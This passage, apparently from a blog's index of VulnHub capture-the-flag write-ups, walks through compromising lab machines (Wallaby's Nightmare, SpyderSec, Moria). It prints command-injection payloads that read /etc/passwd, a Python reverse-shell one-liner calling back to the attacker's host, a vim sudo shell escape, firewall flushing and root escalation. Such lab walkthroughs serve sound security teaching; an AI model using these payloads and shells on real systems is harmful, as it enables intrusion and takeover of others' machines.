/&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.39:60080/?page=mailer&amp;amp;mail=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/command_injection/commandInjectionLinux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 204 ________________________________________________ a|id [Status: 200, Size: 1134, Words: 206, Lines: 31] a|id [Status: 200, Size: 1134, Words: 206, Lines: 31] a;/usr/bin/id [Status: 200, Size: 1134, Words: 206, Lines: 31] a;/usr/bin/id; [Status: 200, Size: 1134, Words: 206, Lines: 31] a|/usr/bin/id [Status: 200, Size: 1134, Words: 206, Lines: 31] %0Acat%20/etc/passwd [Status: 200, Size: 2748, Words: 219, Lines: 62] a|/usr/bin/id [Status: 200, Size: 1134, Words: 206, Lines: 31] %0Aid [Status: 200, Size: 1134, Words: 206, Lines: 31] %0Aid%0A [Status: 200, Size: 1134, Words: 206, Lines: 31] %0A/usr/bin/id%0A [Status: 200, Size: 1134, Words: 206, Lines: 31] %0A/usr/bin/id [Status: 200, Size: 1134, Words: 206, Lines: 31] $;/usr/bin/id [Status: 200, Size: 1134, Words: 206, Lines: 31] a;id [Status: 200, Size: 1134, Words: 206, Lines: 31] a;id; [Status: 200, Size: 1134, Words: 206, Lines: 31] %0Acat%20/etc/passwd [Status: 200, Size: 2748, Words: 219, Lines: 62] :: Progress: [102/102] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:03] :: Errors: 0 :: RCE achieved! Start listener on kali ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Execute python reverse shell payload python -c &#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.110.4&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; www-data shell obtained Privilege EscalationWaldo - Via SUDO Check waldo’s sudo access www-data@ubuntu:/var/www/html$ sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf (ALL) NOPASSWD: /sbin/iptables www-data@ubuntu:/var/www/html$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf /usr/bin/vim /etc/apache2/sites-available/000-default.conf vim has a GTFO Bins entry We are able to spawn a shell in vim /sbin/iptables We are able to view and flush ip-table rules View IP-Table rules www-data@ubuntu:/var/www/html$ sudo /sbin/iptables -L Chain INPUT (policy ACCEPT) target prot opt source destination ACCEPT tcp -- localhost anywhere tcp dpt:ircd DROP tcp -- anywhere anywhere tcp dpt:ircd Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination ircd is blocked Earlier, during our nmap scan we can see that TCP/6667 - irc is filtered ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# nmap $ip -p 6667 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 18:41 +08 Nmap scan report for 192.168.110.39 Host is up (0.00042s latency). PORT STATE SERVICE 6667/tcp filtered irc MAC Address: 08:00:27:80:57:12 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds Remove IP-Table rules www-data@ubuntu:/var/www/html$ sudo /sbin/iptables --flush www-data@ubuntu:/var/www/html$ sudo /sbin/iptables -L Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination www-data@ubuntu:/var/www/html$ TCP/6667 - irc is no longer filtered ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare]└─# nmap $ip -p 6667Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 18:42 +08Nmap scan report for 192.168.110.39Host is up (0.00039s latency).PORT STATE SERVICE6667/tcp open ircMAC Address: 08:00:27:80:57:12 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds Exploit vim, allowing us to privilege escalate to waldo www-data@ubuntu:/var/www/html$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf :!bash Wallaby - Via GTFO Bin + Misconfiguration of irc bot Access TCP/6667 - irc on Kali w/ irssi ┌──(root💀kali)-[~/vulnHub/Wallaby_Nightmare] └─# irssi # Connect to Target /CONNECT 192.168.110.39 # List channels /LIST # Join channel /JOIN wallabyschat # List names, screenshot is based on this command /names More irssi commands View the details of the users connected to the channel /WHOIS wallabysbot /WHOIS waldo wallabysbot is based on sopel What is sopel Sopel is a simple, easy-to-use, open-source IRC utility bot, written in Python. It’s designed to be easy to use, easy to run, and easy to extend. Sopel comes with a ton of ready-made features for you to use. It can leave notes for people, give you reminders, and much more. Sopel commands, .help allows us to list all command’s documentation Instead of using irssi use hexchat(GUI) for easier usage Setup Search for channel (/list) Join channel (/join #wallabyschat) List all wallabysbot commands (.help) Execute .run We must be waldo in order to execute .run We are not able to change our nickname to waldo using an IRC command (/nick waldo), since a user called waldo already exists waldo exists, waldo is somehow connected to the IRC server There is a irssi.sh file that exists on waldo’s home directory waldo@ubuntu:~$ ls irssi.sh waldo@ubuntu:~$ cat irssi.sh #!/bin/bash tmux new-session -d -s irssi tmux send-keys -t irssi &#39;n&#39; Enter tmux send-keys -t irssi &#39;irssi&#39; Enter waldo@ubuntu:~$ There is a tmux session that is connected to the irc server Kill the tmux session waldo@ubuntu:~$ ps aux | grep tmux waldo 720 0.0 0.2 29416 2972 ? Ss 07:24 0:00 tmux new-session -d -s irssi waldo@ubuntu:~$ pkill -9 tmux Change nickname to waldo (/nick waldo) Execute .run Able to execute commands as wallaby Obtain a wallaby shell python -c &#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.110.4&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; wallaby shell obtainedRoot - Via SUDO Check wallaby’s sudo access $ sudo -l sudo -l Matching Defaults entries for wallaby on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wallaby may run the following commands on ubuntu: (ALL) NOPASSWD: ALL Exploit $ sudo su sudo su root@ubuntu:/home/wallaby# whoami whoami root root@ubuntu:/home/wallaby# Flag root@ubuntu:~# cat flag.txt cat flag.txt ###CONGRATULATIONS### You beat part 1 of 2 in the &quot;Wallaby&#39;s Worst Knightmare&quot; series of vms!!!! This was my first vulnerable machine/CTF ever! I hope you guys enjoyed playing it as much as I enjoyed making it! Come to IRC and contact me if you find any errors or interesting ways to root, I&#39;d love to hear about it. Thanks guys! -Waldo root@ubuntu:~# " }, { "title": "Vulnhub - Spydersec Challenge", "url": "/posts/Spydersec-Challenge/", "categories": "Vulnhub, Linux", "tags": "cryptography", "date": "2022-03-11 00:00:00 +0800", "snippet": "ReconTCP/80 (HTTP)NMAP Complete Scan# Nmap 7.92 scan initiated Tue Mar 8 01:22:43 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/spydersec/192.168.110.38/scans/_full_tcp_nmap.txt -oX /root/vulnHub/spydersec/192.168.110.38/scans/xml/_full_tcp_nmap.xml 192.168.110.38adjust_timeouts2: packet supposedly had rtt of -854273 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -854273 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -1102308 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -1102308 microseconds. Ignoring time.Nmap scan report for 192.168.110.38Host is up, received arp-response (0.0019s latency).Scanned at 2022-03-08 01:22:46 +08 for 206sNot shown: 65375 filtered tcp ports (no-response), 158 filtered tcp ports (host-prohibited)PORT STATE SERVICE REASON VERSION22/tcp closed ssh reset ttl 6480/tcp open http syn-ack ttl 64 Apache httpd|_http-favicon: Unknown favicon MD5: 032CC5C2FD1D6AABD91FC08470E0905C|_http-title: SpyderSec | Challenge| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: ApacheMAC Address: 08:00:27:EB:46:EE (Oracle VirtualBox virtual NIC)OS fingerprint not ideal because: Didn&#39;t receive UDP response. Please try again with -sSUAggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.32 (95%), Linux 2.6.39 (93%), Linux 2.6.32 - 3.10 (91%), Linux 3.2 - 3.8 (90%), Linux 2.6.32 - 3.1 (89%), Linux 2.6.32 - 3.0 (89%), Linux 2.6.32 or 3.10 (89%), Linux 2.6.22 - 2.6.36 (88%), Linux 3.10 - 4.11 (88%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=3/8%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=62264034%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=M5B4ST11NW5%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(R=Y%DF=Y%TG=40%W=3908%O=M5B4NNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.020 days (since Tue Mar 8 00:57:06 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTEHOP RTT ADDRESS1 1.87 ms 192.168.110.38Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Mar 8 01:26:12 2022 -- 1 IP address (1 host up) scanned in 208.98 secondsFFUF┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http]└─# ffuf -u http://192.168.110.38/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.log,.bak&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.38/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .log .bak :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.html [Status: 403, Size: 271, Words: 20, Lines: 11].hta [Status: 403, Size: 270, Words: 20, Lines: 11].hta.html [Status: 403, Size: 275, Words: 20, Lines: 11].hta.php [Status: 403, Size: 274, Words: 20, Lines: 11].htaccess.txt [Status: 403, Size: 279, Words: 20, Lines: 11].hta.log [Status: 403, Size: 274, Words: 20, Lines: 11].hta.txt [Status: 403, Size: 274, Words: 20, Lines: 11].htaccess.html [Status: 403, Size: 280, Words: 20, Lines: 11].htaccess.log [Status: 403, Size: 279, Words: 20, Lines: 11].htaccess.bak [Status: 403, Size: 279, Words: 20, Lines: 11].htpasswd.txt [Status: 403, Size: 279, Words: 20, Lines: 11].htpasswd [Status: 403, Size: 275, Words: 20, Lines: 11].htaccess.php [Status: 403, Size: 279, Words: 20, Lines: 11].htpasswd.php [Status: 403, Size: 279, Words: 20, Lines: 11].htpasswd.log [Status: 403, Size: 279, Words: 20, Lines: 11].hta.bak [Status: 403, Size: 274, Words: 20, Lines: 11].htpasswd.bak [Status: 403, Size: 279, Words: 20, Lines: 11].htaccess [Status: 403, Size: 275, Words: 20, Lines: 11].htpasswd.html [Status: 403, Size: 280, Words: 20, Lines: 11] [Status: 200, Size: 8883, Words: 800, Lines: 33]favicon.ico [Status: 200, Size: 1150, Words: 132, Lines: 1]index.php [Status: 200, Size: 8883, Words: 800, Lines: 33]index.php [Status: 200, Size: 8883, Words: 800, Lines: 33]v [Status: 301, Size: 296, Words: 19, Lines: 10]:: Progress: [27690/27690] :: Job [1/1] :: 1005 req/sec :: Duration: [0:00:38] :: Errors: 0 :: vCTF ChallengeTCP/80 (HTTP) - Clue 1 Proceed to index.html “Find clues on this webpage” Found suspicious javascript on the page source Suspicious javascript &amp;lt;script&amp;gt; eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return&#39;\\\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#39;\\\\b&#39;+e(c)+&#39;\\\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;7:0:1:2:8:6:3:5:4:0:a:1:2:d:c:b:f:3:9:e&#39;,16,16,&#39;6c|65|72|27|75|6d|28|61|74|29|64|62|66|2e|3b|69&#39;.split(&#39;|&#39;),0,{})) &amp;lt;/script&amp;gt; Use javascript unpacker to deobfuscate/unpack/beautify the javascript code JavaScript Unpacker is a useful client-side online tool to unpack/ beautify/ deobfuscate your packed JavaScript code. If your JavaScript code looks like: eval(function (p,a,c,k,e,d){…}…)eval(function(p,a,c,k,e,r){…}…). Using this tool, you are able to deobfuscate, beautify, unpack your javascript code Decode it ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# echo -n 61:6c:65:72:74:28:27:6d:75:6c:64:65:72:2e:66:62:69:27:29:3b | xxd -r -p alert(&#39;mulder.fbi&#39;); TCP/80 (HTTP) - Clue 2 Inspect Element -&amp;gt; Sources &amp;amp; download images on the website ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# wget -q http://192.168.110.38/SpyderSecLogo200.png ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# wget -q http://192.168.110.38/Challenge.png ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# wget -q http://192.168.110.38/BG.jpg Analyze the images to look for clues ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# exiftool * ======== BG.jpg ExifTool Version Number : 12.39 File Name : BG.jpg Directory : . File Size : 265 KiB File Modification Date/Time : 2015:09:01 14:17:17+08:00 File Access Date/Time : 2022:03:11 00:56:07+08:00 File Inode Change Date/Time : 2022:03:11 00:56:07+08:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg Exif Byte Order : Little-endian (Intel, II) Quality : 50% DCT Encode Version : 100 APP14 Flags 0 : [14], Encoded with Blend=1 downsampling APP14 Flags 1 : (none) Color Transform : YCbCr Image Width : 1920 Image Height : 1849 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 1920x1849 Megapixels : 3.6 ======== Challenge.png ExifTool Version Number : 12.39 File Name : Challenge.png Directory : . File Size : 83 KiB File Modification Date/Time : 2015:09:01 14:25:59+08:00 File Access Date/Time : 2022:03:11 00:55:58+08:00 File Inode Change Date/Time : 2022:03:11 00:55:58+08:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 540 Image Height : 540 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Background Color : 255 255 255 Pixels Per Unit X : 2835 Pixels Per Unit Y : 2835 Pixel Units : meters Comment : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64 Image Size : 540x540 Megapixels : 0.292 ======== SpyderSecLogo200.png ExifTool Version Number : 12.39 File Name : SpyderSecLogo200.png Directory : . File Size : 25 KiB File Modification Date/Time : 2015:09:01 14:17:17+08:00 File Access Date/Time : 2022:03:11 00:55:51+08:00 File Inode Change Date/Time : 2022:03:11 00:55:51+08:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 200 Image Height : 200 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Significant Bits : 8 8 8 8 Pixels Per Unit X : 599 Pixels Per Unit Y : 599 Pixel Units : meters Software : www.inkscape.org Image Size : 200x200 Megapixels : 0.040 3 image files read Challenge.png has an interesting comment, looks like hexadecmial Decode it ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# echo -n 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64 | xxd -r -p | xxd -r -p | base64 -d A!Vu~jtH#729sLA;h4% Ciphertext is hexadecimal encoded twice &amp;amp; base64 encoded once. TCP/80 (HTTP) - Clue 3 Reload page &amp;amp; intercept w/ burpsuite URL Encoded Decode it ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# hURL -u %2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F Original :: %2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F URL DEcoded :: /v/81JHPbvyEQ8729161jd6aKQ0N4/ TCP/80 (HTTP) - Connecting the dots Proceed to /v/81JHPbvyEQ8729161jd6aKQ0N4/ (Clue 3) 403 Forbidden Proceed to /v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi (Clue 1) mulder.fbi is downloaded Analyze mulder.fbi ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/loot/http] └─# file mulder.fbi mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14] MP4 Since this is a CTF challenge, it is likely a MP4 steganography Research on MP4 steganography Truecrypt volume can be hidden in a MP4 file TCSteg Download TCSteg allows users to hide a TrueCrypt hidden volume in an MP4 file, and the structure of the file makes it difficult to identify that a volume exists tcsteg info (Not needed, we can immediately mount mulder.fbi file as a Truecrypt volume) ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/exploit] └─# python tcsteg2.py too few arguments Usage (1): tcsteg2.py &amp;lt;MP4 Video&amp;gt; &amp;lt;TrueCrypt Container&amp;gt; Embeds a file into a TrueCrypt container so that both are still readable. &amp;lt;MP4 Video&amp;gt; is a file in one of the following formats: QuickTime / ISO MPEG-4 (*.mov, *.qt, *.mp4, *.m4v, *.m4a, *.3gp) &amp;lt;TrueCrypt Container&amp;gt; is a TrueCrypt hidden volume. The file will be modified in-place so that it seems like a copy of the input file that can be opened in an appropriate viewer/player. However, the hidden TrueCtype volume will also be preserved and can be used. Usage (2): tcsteg2.py -p &amp;lt;Hybrid File&amp;gt; &amp;lt;Hybrid File&amp;gt; is a file that is both TrueCrypt container and a video. This file will be modified in-place to make it possible to change the TrueCrypt password. After changing the password, this command should be run again to remove that (detectable and hence insecure) modification! Mount truecrypt volume w/ ‘A!Vu~jtH#729sLA;h4%’ (Clue 2) ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/exploit] └─# veracrypt -tc mulder.fbi truecrypt_volume/ Enter password for /root/vulnHub/Spydersec/192.168.110.38/exploit/mulder.fbi: A!Vu~jtH#729sLA;h4% Enter keyfile [none]: Protect hidden volume (if any)? (y=Yes/n=No) [No]: Flag ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/exploit] └─# cd truecrypt_volume/ ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/exploit/truecrypt_volume] └─# ls Flag.txt ┌──(root💀kali)-[~/vulnHub/Spydersec/192.168.110.38/exploit/truecrypt_volume] └─# cat Flag.txt Congratulations! You are a winner. Please leave some feedback on your thoughts regarding this challenge� Was it fun? Was it hard enough or too easy? What did you like or dislike, what could be done better? https://www.spydersec.com/feedback " }, { "title": "Vulnhub - Moria 1.1", "url": "/posts/Moria-1.1/", "categories": "Vulnhub, Linux", "tags": "linux-priv-esc/linux-creds-found, wireshark", "date": "2022-03-03 00:00:00 +0800", "snippet": "ReconTCP/21 (FTP) Anonymous login disabled ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/scans] └─# ftp $ip Connected to 192.168.110.36. 220 Welcome Balrog! Name (192.168.110.36:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed ftp&amp;gt; Balrog could be the username TCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/moria-1.1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.36/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403________________________________________________ [Status: 200, Size: 85, Words: 5, Lines: 8]index.php [Status: 200, Size: 85, Words: 5, Lines: 8]index.php [Status: 200, Size: 85, Words: 5, Lines: 8]w [Status: 301, Size: 232, Words: 14, Lines: 8]:: Progress: [27690/27690] :: Job [1/1] :: 4932 req/sec :: Duration: [0:00:06] :: Errors: 0 :: wInitial FootholdTCP/80 (HTTP) - Nothing Found Further enumerate w/ ┌──(root💀kali)-[~/vulnHub/moria-1.1] └─# ffuf -u http://$ip/w/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fc 403 -recursion -of html -o ffuf.html /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.36/w/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Output file : ffuf.html :: File format : html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ http://192.168.110.36/w/h/i/s/p/e/r/FUZZ Proceed to http://192.168.110.36/w/h/i/s/p/e/r/ Contents of the_abyss/index.php changes everytime we visit it Directory enumerate the_abyss/ ┌──(root💀kali)-[~/vulnHub/moria-1.1] └─# ffuf -u http://192.168.110.36/w/h/i/s/p/e/r/the_abyss/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.php,.txt,&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.36/w/h/i/s/p/e/r/the_abyss/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ index.php [Status: 200, Size: 21, Words: 4, Lines: 2] random.txt [Status: 200, Size: 407, Words: 54, Lines: 14] :: Progress: [23075/23075] :: Job [1/1] :: 2929 req/sec :: Duration: [0:00:05] :: Errors: 0 :: random.txt The content on the_abyss is randomized from random.txt Port Knocking? Wireshark - Suspicious Network Traffic Unsure of what to do, started wireshark to observe the network traffic between Kali and the Moria 1.1 machine. SYN Packet coming from Moria 1.1 to Kali 77, 101, 108, 108, 111, 110, 54, 57 Port Knocking - Failed Port knock ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/scans] └─# knock -v $ip 77 101 108 108 111 110 54 57 hitting tcp 192.168.110.36:77 hitting tcp 192.168.110.36:101 hitting tcp 192.168.110.36:108 hitting tcp 192.168.110.36:108 hitting tcp 192.168.110.36:111 hitting tcp 192.168.110.36:110 hitting tcp 192.168.110.36:54 hitting tcp 192.168.110.36:57 Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/scans] └─# nmap $ip -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 18:14 +08 Nmap scan report for 192.168.110.36 Host is up (0.00023s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:BA:33:82 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds No new ports Instead, convert to ASCII Mellon69 TCP/21 (FTP) - Found web content Access FTP w/ Balrog:Mellon69 ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/loot] └─# ftp $ip Connected to 192.168.110.36. 220 Welcome Balrog! Name (192.168.110.36:root): Balrog 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; pwd Remote directory: /prison ftp&amp;gt; dir 229 Entering Extended Passive Mode (|||24812|). 150 Here comes the directory listing. 226 Directory send OK. ftp&amp;gt; cd .. 250 Directory successfully changed. ftp&amp;gt; ls 229 Entering Extended Passive Mode (|||44933|). 150 Here comes the directory listing. lrwxrwxrwx 1 0 0 7 Mar 11 2017 bin -&amp;gt; usr/bin dr-xr-xr-x 4 0 0 4096 Mar 11 2017 boot drwxr-xr-x 19 0 0 2960 Feb 28 16:30 dev drwxr-xr-x 97 0 0 8192 Feb 28 16:30 etc drwxr-x--- 4 0 1003 32 Mar 14 2017 home lrwxrwxrwx 1 0 0 7 Mar 11 2017 lib -&amp;gt; usr/lib lrwxrwxrwx 1 0 0 9 Mar 11 2017 lib64 -&amp;gt; usr/lib64 drwxr-xr-x 2 0 0 6 Nov 05 2016 media drwxr-xr-x 2 0 0 6 Nov 05 2016 mnt drwxr-xr-x 2 0 0 6 Nov 05 2016 opt drwxr-x--- 2 0 1001 27 Mar 14 2017 prison dr-xr-xr-x 115 0 0 0 Feb 28 08:30 proc dr-xr-x--- 8 0 0 276 Mar 13 2017 root drwxr-xr-x 26 0 0 760 Mar 01 05:01 run lrwxrwxrwx 1 0 0 8 Mar 11 2017 sbin -&amp;gt; usr/sbin drwxr-xr-x 2 0 0 6 Nov 05 2016 srv dr-xr-xr-x 13 0 0 0 Feb 28 16:30 sys drwxrwxrwt 8 0 0 170 Mar 01 06:18 tmp drwxr-xr-x 13 0 0 155 Mar 11 2017 usr drwxr-xr-x 21 0 0 4096 Feb 28 16:30 var 226 Directory send OK. ftp&amp;gt; pwd The entire filesystem is shared on FTP Proceed to /var/www/html, to look for additional web content ftp&amp;gt; cd /var/www/html 250 Directory successfully changed. ftp&amp;gt; dir 229 Entering Extended Passive Mode (|||14844|). 150 